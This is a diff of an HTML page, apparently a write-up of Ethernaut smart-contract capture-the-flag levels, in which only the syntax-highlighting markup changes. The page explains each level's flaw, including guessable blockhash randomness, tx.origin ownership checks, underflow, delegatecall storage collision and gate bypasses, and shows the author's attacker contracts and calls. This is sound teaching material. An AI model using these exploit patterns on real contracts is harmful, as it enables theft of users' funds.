@@ -297,25 +297,25 @@
 <ol>
 <li>The variable FACTOR</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+<pre class=" language-js"><code class="prism  language-js">uint256 FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
 </code></pre>
 <ol start="2">
 <li>The block hash of the previous block to the coinflip converted to integer</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+<pre class=" language-js"><code class="prism  language-js">uint256 blockValue <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>Our coinflip is floor of the ratio between <code>blockValue</code> and <code>FACTOR</code></p>
-<pre class=" language-cs"><code class="prism  language-cs">uint256 coinFlip = blockValue.div(FACTOR);
-bool side = coinFlip == 1 ? true : false;
+<pre class=" language-js"><code class="prism  language-js">uint256 coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+bool side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
 </code></pre>
 <p>The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the <code>flip()</code> function.</p>
-<pre class=" language-cs"><code class="prism  language-cs">function callFlip() external {
-    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    uint256 blockVal = uint256(blockhash(block.number - 1));
-    uint256 division = blockVal / factor;
-    bool guess = division == 1 ? true : false;
-    coinFlipContract.flip(guess);
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
+    uint256 factor <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
+    uint256 blockVal <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    uint256 division <span class="token operator">=</span> blockVal <span class="token operator">/</span> factor<span class="token punctuation">;</span>
+    bool guess <span class="token operator">=</span> division <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    coinFlipContract<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <h3 id="how-i-did-it-1">How I did it</h3>
 <p>I did exactly what I described in the <a href="#solution-1">solution section</a>, but I inherited from Ownable to create the <code>CoinFlipAttack</code> contract as a way to restrict calling the <code>callFlip()</code> function only from the deployer of the attacker contract. After coding the contract I did the following steps:</p>
@@ -361,20 +361,20 @@ bool side = coinFlip == 1 ? true : false;
 <p>Claim ownership of the contract to complete this level.</p>
 <h3 id="solution-2">Solution</h3>
 <p>The function <code>changeOwner()</code> compares whether the address that sends the tx (<code>tx.origin</code>) is the same as the address that interacts with the contract (<code>msg.sender</code>). In this case it isn’t, so the owner is changed as per the function’s instructions:</p>
-<pre class=" language-cs"><code class="prism  language-cs">function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-        owner = _owner;
-    }
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span>address _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>Therefore, the only thing needed here is a attacking contract which interacts with the original Telephone contract. This way the contract is the <code>msg.sender</code> while the address that interacts with the attacking contract is the <code>tx.origin</code>.</p>
 <h3 id="how-i-did-it-2">How I did it</h3>
 <ol>
 <li>I deployed the contract <code>TelephoneAttack</code> (at: <code>0x756a2E146F4f9659E7c16a90948A09aB09925F19</code>) which interfaces with the original Telephone contract and calls its <code>changeOwner()</code> function as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function callChangeOwner(address _newOwner) external {
-    telephoneContract.changeOwner(_newOwner);
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callChangeOwner</span><span class="token punctuation">(</span>address _newOwner<span class="token punctuation">)</span> external <span class="token punctuation">{</span>
+    telephoneContract<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>_newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>where <code>_newOwner</code> is the address we want to assign as new contract owner for the Telephone contract.</p>
 <ol start="2">
@@ -398,26 +398,26 @@ bool side = coinFlip == 1 ? true : false;
 <p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
 <h3 id="solution-3">Solution</h3>
 <p>This contract is using the solidity compiler version 0.6.0, therefore mathematical operations can lead to overflows. In this case, the vulnerability occurs when attempting to call the <code>transfer()</code> function:</p>
-<pre class=" language-cs"><code class="prism  language-cs">function transfer(address _to, uint _value) public returns (bool) {
-    require(balances[msg.sender] - _value &gt;= 0);
-    balances[msg.sender] -= _value;
-    balances[_to] += _value;
-    return true;
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span>address _to<span class="token punctuation">,</span> uint _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
+    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>The line <code>require(balances[msg.sender] - _value &gt;= 0);</code> checks if the user balance is larger than or equal to zero, but since balances are unsigned integers, when the number we subtract (<code>_value</code>) is larger than the wallet’s balance (<code>balances[msg.sender]</code>) of the token, an overflow occurs and the wallet’s balance becomes the largest unsigned integer minus the difference between these two values.</p>
 <p>After passing the require statement, there is another mistake where this overflowed value is assigned to the balance of <code>msg.sender</code>:</p>
-<pre class=" language-cs"><code class="prism  language-cs">balances[msg.sender] -= _value;
+<pre class=" language-js"><code class="prism  language-js">balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
 </code></pre>
 <p>All we have to do to exploit the contract is call the transfer function as follows:</p>
-<pre class=" language-cs"><code class="prism  language-cs">transfer('any address except the sending address', 21)
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token string">'any address except the sending address'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>
 </code></pre>
 <p>From the address whose funds we want to cause the overflow on.</p>
 <h4 id="how-i-did-it-3">How I did it</h4>
 <ol>
 <li>I called the <code>transfer()</code> function and sent 21 tokens (1 more than the original 20 to cause an overflow) to the contract address of the Token contract.</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">token.transfer(EthernautContractAddresses['token'], 21, _from)
+<pre class=" language-js"><code class="prism  language-js">token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>EthernautContractAddresses<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
 </code></pre>
 <p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662">https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662</a></p>
 <ol start="2">
@@ -480,11 +480,11 @@ bool side = coinFlip == 1 ? true : false;
 <pre class=" language-python"><code class="prism  language-python">forceattack <span class="token operator">=</span> ForceAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
 </code></pre>
 <p>And make sure the contract can receive funds and also has a function that calls <code>selfdestruct()</code> to the contract address of our instance:</p>
-<pre class=" language-cs"><code class="prism  language-cs">function reload() external payable {}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span><span class="token punctuation">}</span>
 
-function forceEtherIntoAddress(address payable _to) external onlyOwner {
-    selfdestruct(_to);
-}
+<span class="token keyword">function</span> <span class="token function">forceEtherIntoAddress</span><span class="token punctuation">(</span>address payable _to<span class="token punctuation">)</span> external onlyOwner <span class="token punctuation">{</span>
+    <span class="token function">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>I also optionally added a fallback <code>receive()</code> function and made the contract <code>Ownable</code> so that only I could call the <code>selfdestruct()</code> function (not that anyone would’ve done it anyway…)</p>
 <ol start="2">
@@ -553,10 +553,10 @@ function forceEtherIntoAddress(address payable _to) external onlyOwner {
 <ol start="2">
 <li>Call the <code>becomeKing()</code> function, while sending enough funds to take over the contract (1e15 wei = 0.001 ether) defined in the contract as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function becomeKing() external payable {
-    (bool success,) = address(kingContract).call{value: msg.value}("");
-    require(success, "Transfer failed.");
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">becomeKing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
+    <span class="token punctuation">(</span>bool success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>kingContract<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Transfer failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>Calling it in python, we get the value directly from the King contract’s storage position 2, where the prize is located (located in position 2 because it is a uin256 which occupies a full slot and the first slot is occupied by an address, also 32 bytes).</p>
 <pre class=" language-python"><code class="prism  language-python">kingattack<span class="token punctuation">.</span>becomeKing<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>king<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">|</span> _from<span class="token punctuation">)</span>
@@ -620,15 +620,15 @@ function forceEtherIntoAddress(address payable _to) external onlyOwner {
 <ol>
 <li>Create and deploy a Building contract (at: <code>0x970b299cCB253F5b4f58fEbde41Ffe2D2b25F885</code>) to interact with the Elevator contract where I define the <code>isLastFloor()</code> function:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function isLastFloor(uint256) external returns (bool) {
-    lastFloorBool = elevatorContract.floor() == topFloor;
-    return lastFloorBool;
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> external <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    lastFloorBool <span class="token operator">=</span> elevatorContract<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> topFloor<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> lastFloorBool<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>And a function to go to the top floor which calls <code>goTo()</code> in the elevator contract:</p>
-<pre class=" language-cs"><code class="prism  language-cs">function goToTopFloor() external {
-    elevatorContract.goTo(topFloor);
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">goToTopFloor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
+    elevatorContract<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span>topFloor<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ol start="2">
 <li>Call the <code>goToTopFloor()</code> function which will first see that it’s not at the top floor (<code>floor</code> is 0 initially), then floor changes and <code>floor</code> = <code>topFloor</code> and the second time <code>isLastFloor()</code> is called returns <code>true</code> which is then assigned to <code>top</code>.</li>
@@ -653,12 +653,12 @@ function forceEtherIntoAddress(address payable _to) external onlyOwner {
 <p>Each slot has a capacity of 32 bytes (256 bits), meaning that data types which actually fill up a 32 byte slot, are going to take up a whole slot, so the following ones roll over to the next slot. If a data type is declared as <code>uint256</code> or <code>bytes32</code>, it will always occupy a full storage slot, as these types are already 32 bytes in size.</p>
 <p>In the case of the Privacy contract, we know that the relevant piece of data is the last element of the array <code>data</code>. Therefore, to extract this, we must determine <em>where</em> this piece of data is, in what storage slot.</p>
 <p>This contract’s state variables are, in order:</p>
-<pre class=" language-cs"><code class="prism  language-cs">bool public locked = true;
-uint256 public ID = block.timestamp;
-uint8 private flattening = 10;
-uint8 private denomination = 255;
-uint16 private awkwardness = uint16(now);
-bytes32[3] private data;
+<pre class=" language-js"><code class="prism  language-js">bool <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+uint256 <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
+uint8 <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
+uint8 <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
+uint16 <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>
+bytes32<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>
 </code></pre>
 <p>Therefore, the storage looks a little like this:</p>
 
@@ -741,12 +741,12 @@ bytes32[3] private data;
 <p>The remaining gas (<code>gasleft()</code>) after the code as ran has to be a multiple of 8191. This can be done my performing an external call to the GatekeeperOne contract where we run the <code>enter()</code> function and additionally send both the gas needed to perform the instructions <em>and</em> a multiple of 8191. I coded it as follows:</p>
 </li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">(success,) = address(gko).call{
-            gas: additionalGas + 10*8191
-        }(abi.encodeWithSignature(
-            'enter(bytes8)', 
+<pre class=" language-js"><code class="prism  language-js"><span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>gko<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>
+            gas<span class="token punctuation">:</span> additionalGas <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8191</span>
+        <span class="token punctuation">}</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span>
+            <span class="token string">'enter(bytes8)'</span><span class="token punctuation">,</span> 
             _modifiedTxOriginBytes
-        ));
+        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>where:</p>
 <ul>
@@ -778,25 +778,25 @@ bytes32[3] private data;
 </ol>
 <p>The function takes a parameter <code>address</code> and then casts it into <code>uint64</code> and then into <code>bytes8</code> to pass it to <code>enter()</code>, as <code>enter()</code> takes a <code>bytes8</code> parameter.</p>
 <p>The second parameter will be a number, it can be a <code>uint16</code> as we will deal with small values. This number will be the amount of gas that will be used by instructions in the Gatekeeper One contract call. A multiple of 8191 has to be added to this message call to the amount of additional gas passed through <code>additionalGas</code> in order to pass the 2nd check.</p>
-<pre class=" language-cs"><code class="prism  language-cs">function callEnter(address _modifiedTxOrigin, uint16 additionalGas) public returns (bool) {
-    // modified tx origin is tx origin with tweaks to pass the require statements in `enter()`
-    bytes8 _modifiedTxOriginBytes = bytes8(uint64(_modifiedTxOrigin));
-    bool success;
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callEnter</span><span class="token punctuation">(</span>address _modifiedTxOrigin<span class="token punctuation">,</span> uint16 additionalGas<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// modified tx origin is tx origin with tweaks to pass the require statements in `enter()`</span>
+    bytes8 _modifiedTxOriginBytes <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_modifiedTxOrigin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    bool success<span class="token punctuation">;</span>
 
-    // send a message call with a specific amount of gas + a multiple of 8191
-    (success,) = address(gko).call{
-        gas: additionalGas + 10*8191
-    }(abi.encodeWithSignature(
-        'enter(bytes8)', 
+    <span class="token comment">// send a message call with a specific amount of gas + a multiple of 8191</span>
+    <span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>gko<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">{</span>
+        gas<span class="token punctuation">:</span> additionalGas <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8191</span>
+    <span class="token punctuation">}</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span>
+        <span class="token string">'enter(bytes8)'</span><span class="token punctuation">,</span> 
         _modifiedTxOriginBytes
-    ));
+    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    // require success
-    require(success, 'call failed');
+    <span class="token comment">// require success</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">'call failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    // return result of the success
-    return success;
-}
+    <span class="token comment">// return result of the success</span>
+    <span class="token keyword">return</span> success<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ol start="2">
 <li>Modify my address (the <code>tx.origin</code>, <code>0x98bCCA1C6023e3F851090e079030da43d9F229d1</code>) in order to pass the third check, in this case I used <code>0x0000000000000000000000000000000A000029d1</code>. This will pass all checks as described in <a href="#solution-11">solution</a>.</li>
@@ -821,8 +821,8 @@ bytes32[3] private data;
 <ol start="4">
 <li>Check if we are <code>entrant</code></li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">entrant_assertion = gatekeeper.entrant() == acc.address
-print(f"Address is entrant: {entrant_assertion}")
+<pre class=" language-js"><code class="prism  language-js">entrant_assertion <span class="token operator">=</span> gatekeeper<span class="token punctuation">.</span><span class="token function">entrant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
+<span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"Address is entrant: {entrant_assertion}"</span><span class="token punctuation">)</span>
 </code></pre>
 <h3 id="submission-transaction-12">Submission transaction</h3>
 <p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835">https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835</a></p>
@@ -845,22 +845,22 @@ print(f"Address is entrant: {entrant_assertion}")
 <p>The bitwise <code>XOR</code> and each element operated through it is its own inverse, so if we have that if:</p>
 </li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
 </code></pre>
 <p>Is true, then:</p>
-<pre class=" language-cs"><code class="prism  language-cs">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span>
 </code></pre>
 <p>is also true. Therefore, <em>we don’t need <code>_gateKey</code></em>, we can simply pass the result of <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1</code> as the parameter of <code>enter()</code> but casted to <code>bytes8</code> as that’s what <code>enter()</code> calls for.</p>
 <h3 id="how-i-did-it-12">How I did it</h3>
 <ol>
 <li>Code an attacker contract where we I define the contract constructor as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">constructor(address _instance) public {
-    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">constructor</span><span class="token punctuation">(</span>address _instance<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    bytes8 gateKey <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    (bool success,) = _instance.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
-    require(success, "external call failed");
-}
+    <span class="token punctuation">(</span>bool success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> _instance<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"enter(bytes8)"</span><span class="token punctuation">,</span> gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"external call failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ol start="2">
 <li>Then simply deploy the contract (at: <code>0x6961C8C27dC8f153c62815E0EBb0c7bb75d974E1</code>) and on the constructor run, the <code>enter()</code> function is called</li>
@@ -887,12 +887,12 @@ print(f"Address is entrant: {entrant_assertion}")
 <ol>
 <li>Call <code>approve()</code> as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">approve(Account2Address, Account1Balance)
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">approve</span><span class="token punctuation">(</span>Account2Address<span class="token punctuation">,</span> Account1Balance<span class="token punctuation">)</span>
 </code></pre>
 <ol start="2">
 <li>Call <code>transferFrom()</code> as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">transferFrom(Account1Address, Account2Address, Account1Balance)
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">transferFrom</span><span class="token punctuation">(</span>Account1Address<span class="token punctuation">,</span> Account2Address<span class="token punctuation">,</span> Account1Balance<span class="token punctuation">)</span>
 </code></pre>
 <p>Where:</p>
 <ul>
@@ -937,25 +937,25 @@ naughtcoin<span class="token punctuation">.</span>approve<span class="token punc
 <p>The preservation contract uses the contracts allocated in the addresses <code>timeZone1Library</code> and <code>timeZone2Library</code> as library contracts. Thus, all calls to these contracts are done through <code>delegatecall</code> in the Preservation contract and do NOT touch the storage of each respective <code>LibraryContract</code> but rather the storage of the Preservation contract.</p>
 <p>When we modify the variable <code>storedTime</code> through a <code>delegatecall</code> of the <code>setTime()</code> function in the library contracts, we are not modifying <code>storedTime</code> in neither the library or the Preservation contracts, but rather <em>the variable occupying the respective storage slot of <code>storedTime</code></em> in the Preservation contract.</p>
 <p>Therefore, calling either <code>setFirstTime()</code> or <code>setSecondTime()</code> will modify <code>timeZone1Library</code> with whatever value we pass as <code>_timeStamp</code>. Therefore, in order to exploit the contract and become <code>owner</code>, we need to deploy a contract with the <em>same storage layout as Preservation</em>, this means that our attacker contract should define:</p>
-<pre class=" language-cs"><code class="prism  language-cs">address public timeZone1Library;
-address public timeZone2Library;
-address public owner; 
+<pre class=" language-js"><code class="prism  language-js">address <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>
+address <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>
+address <span class="token keyword">public</span> owner<span class="token punctuation">;</span> 
 </code></pre>
 <p>In the exact same order as Preservation.</p>
 <p>Also, there must be two additional functions defined in the attacker contract:</p>
 <ul>
 <li>A function <code>setTime()</code> that takes a <code>uint256</code> parameter, which will, in the case of the attacker contract, modify the variable in its <em>3rd memory slot</em>, so <code>owner</code>. The name of this variable is not relevant, since we’re only interested in modifying the 3rd memory slot in Preservation, but for consistency’s purposes, I also named it <code>owner</code>.</li>
 </ul>
-<pre class=" language-cs"><code class="prism  language-cs">function setTime(uint256) public {
-    owner = tx.origin;
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    owner <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ul>
 <li>A function where <code>setFirstTime()</code> is called in Preservation in order to make <code>timeZone1Library</code> the attacker contract. If each LibraryContract was <em>correctly coded</em> with an identical layout to Preservation, the Preservation contract wouldn’t be vulnerable in this way.</li>
